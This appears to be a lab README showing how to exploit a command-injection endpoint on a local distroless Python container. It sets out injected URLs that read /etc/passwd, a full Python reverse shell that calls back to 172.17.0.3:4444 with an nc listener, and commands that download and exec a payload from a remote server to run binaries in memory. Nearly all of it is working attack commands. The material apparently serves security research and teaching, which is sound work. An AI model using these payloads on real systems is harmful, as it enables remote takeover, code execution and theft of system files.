### Build distroless
```bash
docker build . -t py-rce-dless
docker start -p 8080:8080 py-rce-dless
```

### Raw image (no distroless)
```bash
docker run -it python:3.10-slim sh
```

### Execute builtin shell functions
`http://127.0.0.1:8080/?cmd=command -v python`

### Read File
`http://127.0.0.1:8080/?cmd=while read -r line; do echo $line; done</etc/passwd`

### Run python
`http://127.0.0.1:8080/?cmd=python -c "exec('import platform\nprint(platform.uname())')"`

### Get python rev shell

**Start a listener** on your machine:

```bash
nc -lvnp 4444
```

Get **python reverse shell** (change your IP and port):

```bash
http://127.0.0.1:8080/?cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.17.0.3",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/usr/bin/python","-i"]);'
```

**You should have received the python shell!**


### Execute arbitrary binaries

Generate the payload to load in memory with `fee /bin/ls > ls.py`. **AND UPDATE** the payload with the following code at the beggining **or you will lose your shell**:

```python
# imports ...
pid = os.fork()
if pid == 0: #pid==0 represents the child process
# Rest of the payload inside this if
```

**If you want to execute the binary with more params, add them in the last line of the payload**

In your python reverse shell run this to **download and execute the binary**:

```python
from urllib import request
ls = request.urlopen("http://172.17.0.3:8989/tmp/ls.py").read()
exec(ls)
```


### Execute arbitrary binaries without python rev shell
```bash
url = "http://172.17.0.3:8989/tmp/ls.py";
tmp_dir = "/tmp/";
open(tmp_dir+url.split("/")[-1], "wb").write(__import__('urllib').request.urlopen(url).read());
# Change url and tmp_dir if nececesary and remove new lines
```

- Download `libselinux.so.1`: `http://127.0.0.1:8080/?cmd=python -c 'url="http://172.17.0.3:8989/lib/aarch64-linux-gnu/libselinux.so.1";tmp_dir = "/tmp/";open(tmp_dir+url.split("/")[-1], "wb").write(__import__("urllib", fromlist=["request"]).request.urlopen(url).read());'`

- Download `libpcre2-8.so.0`: `http://127.0.0.1:8080/?cmd=python -c 'url="http://172.17.0.3:8989/usr/lib/aarch64-linux-gnu/libpcre2-8.so.0";tmp_dir = "/tmp/";open(tmp_dir+url.split("/")[-1], "wb").write(__import__("urllib", fromlist=["request"]).request.urlopen(url).read());'`

- Download `exploit.py`: `http://127.0.0.1:8080/?cmd=python -c 'url="http://172.17.0.3:8989/tmp/ls.py";tmp_dir = "/tmp/";open(tmp_dir+url.split("/")[-1], "wb").write(__import__("urllib", fromlist=["request"]).request.urlopen(url).read());'`

*It was generated with `fee /bin/ls > output.py`*

- Execute `ls`: `http://127.0.0.1:8080/?cmd=python /tmp/ls.py`

